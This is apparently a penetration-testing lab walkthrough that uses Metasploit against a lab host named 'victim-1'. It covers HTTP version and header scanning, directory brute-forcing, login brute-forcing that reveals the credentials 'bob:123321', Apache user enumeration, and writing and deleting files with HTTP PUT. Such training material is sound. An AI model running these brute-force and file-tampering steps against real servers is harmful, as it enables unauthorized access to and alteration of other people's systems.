HTTP - Port 80
HTTPS - Port 443 - with SSL/TLS certificate

```
# TO GET HTTP VERSION
service postgresql start
─# msfconsole
msf6 > workspace -a Web_Enum
msf6 > workspace 
msf6 > setg RHOSTS victim-1
msf6 > setg RHOST victim-1
msf6 > search http
msf6 > search type:auxiliary name:http
msf6 > use auxiliary/scanner/http/http_version 
msf6 auxiliary(scanner/http/http_version) > show options
# we can set SSL to true if we are dealing with a website that uses SSL certificate
msf6 auxiliary(scanner/http/http_version) > run

# TO GET HTTP HEADER
msf6 auxiliary(scanner/http/http_version) > search http_header
msf6 auxiliary(scanner/http/http_version) > use auxiliary/scanner/http/http_header
msf6 auxiliary(scanner/http/http_header) > show options 
msf6 auxiliary(scanner/http/http_header) > run


msf6 auxiliary(scanner/http/http_header) > search robots_txt
msf6 auxiliary(scanner/http/http_header) > use auxiliary/scanner/http/robots_txt
msf6 auxiliary(scanner/http/robots_txt) > show options 
msf6 auxiliary(scanner/http/robots_txt) > run
msf6 auxiliary(scanner/http/robots_txt) > curl http://victim-1/data/
msf6 auxiliary(scanner/http/robots_txt) > curl http://victim-1/secure/


# BRUTE FORCE DIRECTORIES NAME
msf6 auxiliary(scanner/http/robots_txt) > search dir_scanner
msf6 auxiliary(scanner/http/robots_txt) > use auxiliary/scanner/http/dir_scanner
msf6 auxiliary(scanner/http/dir_scanner) > show options
msf6 auxiliary(scanner/http/dir_scanner) > run

# ENUMERATE LIST OF DIRECTORIES ******Gives maximum list of directories*****
msf6 auxiliary(scanner/http/dir_scanner) > search files_dir
msf6 auxiliary(scanner/http/dir_scanner) > use auxiliary/scanner/http/files_dir
msf6 auxiliary(scanner/http/files_dir) > show options 
msf6 auxiliary(scanner/http/files_dir) > run


# BRUTE FORCE HTTP LOGIN INTO A DIRECTORY
msf6 auxiliary(scanner/http/files_dir) > search http_login
msf6 auxiliary(scanner/http/files_dir) > use auxiliary/scanner/http/http_login 
msf6 auxiliary(scanner/http/http_login) > show options 
msf6 auxiliary(scanner/http/http_login) > set AUTH_URI /secure/
msf6 auxiliary(scanner/http/http_login) > unset USERPASS_FILE
msf6 auxiliary(scanner/http/http_login) > run
[+] 192.151.171.3:80 - Success: 'bob:123321'
msf6 auxiliary(scanner/http/http_login) > set USER_FILE /usr/share/metasploit-framework/data/wordlists/namelist.txt
msf6 auxiliary(scanner/http/http_login) > set USER_FILE /usr/share/metasploit-framework/data/wordlists/namelist.txt
msf6 auxiliary(scanner/http/http_login) > run
msf6 auxiliary(scanner/http/http_login) > set VERBOSE false
# to show only valid usernames and passwords got



msf6 auxiliary(scanner/http/http_login) > search apache_userdir_enum
msf6 auxiliary(scanner/http/http_login) > use auxiliary/scanner/http/apache_userdir_enum
msf6 auxiliary(scanner/http/apache_userdir_enum) > show options 
msf6 auxiliary(scanner/http/apache_userdir_enum) > info
msf6 auxiliary(scanner/http/apache_userdir_enum) > set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
msf6 auxiliary(scanner/http/files_dir) > search http_login
msf6 auxiliary(scanner/http/files_dir) > use auxiliary/scanner/http/http_login 
msf6 auxiliary(scanner/http/http_login) > show options 
msf6 auxiliary(scanner/http/http_login) > echo "rooty" > user.txt
msf6 auxiliary(scanner/http/http_login) > set USER_FILE /root/user.txt
```


**Module 8:** auxiliary/scanner/http/http_put

**Commands:**

```
use auxiliary/scanner/http/http_put
set RHOSTS victim-1
set PATH /data
set FILENAME test.txt
set FILEDATA "Welcome To AttackDefense"
run
```

![Content Image](https://assets.ine.com/lab/learningpath/9746dc4d0a923fea584a486dcd80dd44aff0aa1b9541ba768344dab24980035b.png)

We can observe that we have successfully written a file on the target server. If the file is already exists it will overwrite it. Let’s use wget and download the test.txt file and verify it.

**Commands:**

```
wget http://victim-1:80/data/test.txt 
cat test.txt
```

![Content Image](https://assets.ine.com/lab/learningpath/596f21ad6fab8c7fbdf24a0ceddab0933e2113190750d904a479bc959e493f3c.png)

We can download the text.txt file and we can see it’s content i.e "Welcome To AttackDefense"

Now, let’s use DELETE method and delete the text.file

**Commands:**

```
use auxiliary/scanner/http/http_put
set RHOSTS victim-1
set PATH /data
set FILENAME test.txt
set ACTION DELETE
run
```

![Content Image](https://assets.ine.com/lab/learningpath/a562fd9cc71d5ff19b941e5a34122df2b5df629cb26f70fdbb193a4582c382e5.png)

Let’s try to download the same file from the same path. This time we should receive 404 error. i.e file not found. Because we have deleted it.

**Command:**

```
wget http://victim-1:80/data/test.txt 
```

![Content Image](https://assets.ine.com/lab/learningpath/d242d6b32467ad39d96c9a9e6b7e66855a885f1e3e49f57d87b862a6d4191983.png)

